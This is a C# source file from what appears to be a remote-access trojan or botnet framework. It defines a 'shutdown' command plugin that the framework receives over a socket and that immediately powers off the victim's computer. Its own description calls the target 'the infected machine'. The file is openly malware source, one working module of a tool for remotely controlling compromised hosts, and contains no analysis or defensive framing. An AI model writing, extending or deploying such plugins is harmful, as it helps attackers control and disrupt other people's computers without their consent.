using Common.Attributes;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.Serialization;

namespace Common.Commands.Executer_Commands
{
    [Serializable]
    [CommandName("shutdown")]
    public class ShutDown_Command : Command
    {
        public void execute(Socket sendTo)
        {
            try
            {
                Process.Start("shutdown", "/s /t 0");
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error occured while executing shutdown command!\n{0}", ex.ToString());
            }
        }

        public void printDescription()
        {
            Console.WriteLine("This plugin will shut down the infected machine");
        }

        #region Serializable

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            throw new NotImplementedException();
        }

        #endregion
    }
}
